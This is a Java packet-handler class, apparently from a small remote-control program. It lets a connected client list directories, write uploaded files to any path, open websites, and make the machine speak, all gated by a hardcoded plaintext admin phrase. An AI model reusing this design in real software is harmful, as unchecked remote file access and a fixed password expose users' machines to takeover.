package NetworkUtils;

import NetworkUtils.Packets.*;
import Other.Util;

import java.awt.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URI;
import java.util.Arrays;

public class PacketHandler {
    private SocketConnection connection;

    public PacketHandler(SocketConnection connection) {
        this.connection = connection;
    }

    public void onHandshake(HandshakePacket packet) {
    }

    public void onAdminID(AdminIDPacket packet) {
        String adminID = packet.getAdminID().trim();

        if (isValidAdmin(adminID)) {
            System.out.println("Admin client connected!");
            connection.sendPacket(new PrintPacket("Admin verified!"));
        } else {
            System.out.println("Invalid Admin ID: " + adminID);
            connection.sendPacket(new PrintPacket("Invalid Admin ID: " + adminID));
            connection.close();
        }
    }

    private boolean isValidAdmin(String adminID) {
        return adminID.equals("Winston smells");
    }

    public void onPrint(PrintPacket packet) {
        System.out.println("[Message] : " + packet.getMessage());
    }

    public void onSpeak(SpeakPacket packet) {
        Util.speak(packet.getMessage());
    }

    public void onUploadStart(FileUploadStartPacket packet) {
        // Register the file upload task
        connection.registerFileID(packet);
        System.out.println("Starting upload for id : " + packet.getId());
    }

    public void onWebsite(WebsitePacket packet) {
        System.out.println("Received website packet!");
        try {
            String s = packet.getUrl();
            if (!s.startsWith("http")) s = "https://" + s;
            Desktop.getDesktop().browse(new URI(s));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onViewDirectory(ViewDirectoryPacket packet) {
        String path = packet.getPath();
        File dir = new File(path);

        if (dir.exists() && dir.isDirectory()) {
            String[] files = dir.list();
            // Send directory contents back to the client
            String directoryContents = files != null ? Arrays.toString(files) : "No files found";
            connection.sendPacket(new PrintPacket("Directory contents: " + directoryContents));
        } else {
            connection.sendPacket(new PrintPacket("Invalid directory: " + path));
        }
    }

    public void onChangeDirectory(ChangeDirectoryPacket packet) {
        String newPath = packet.getPath();
        File newDir = new File(newPath);

        if (newDir.exists() && newDir.isDirectory()) {
            // Update server's current directory state
            connection.sendPacket(new PrintPacket("Changed to directory: " + newPath));
        } else {
            connection.sendPacket(new PrintPacket("Invalid directory: " + newPath));
        }
    }

    public void onUploadRequest(UploadRequestPacket packet) {

    }

    public void onFileChunk(FileChunkPacket packet) {
        connection.addToFileID(packet.getId(), packet.getData());
        System.out.println("Received chunk for id : " + packet.getId());
    }

    // File upload/download is complete
    public void onFileComplete(FileCompletePacket packet) {
        FileTask task = connection.finishFileID(packet.getId());
        System.out.println("File operation id : " + packet + " completed and removed from active uploads.");

        String fullPath = task.getFilePath() + "\\" + task.getFileName();
        File file = new File(fullPath);
        FileOutputStream writer;
        try {
            file.createNewFile();
            writer = new FileOutputStream(file, true);
        } catch (Exception e) {
            System.err.println("Failed to create/find file : " + fullPath);
            return;
        }
        try {
            for (byte[] b : task.data) {
                writer.write(b);
            }
            writer.close();
        } catch (IOException e) {
            System.err.println("Failed to write to file : " + fullPath);
            return;
        }
        System.out.println("Successfully saved file to : " + file.getPath());
    }
}
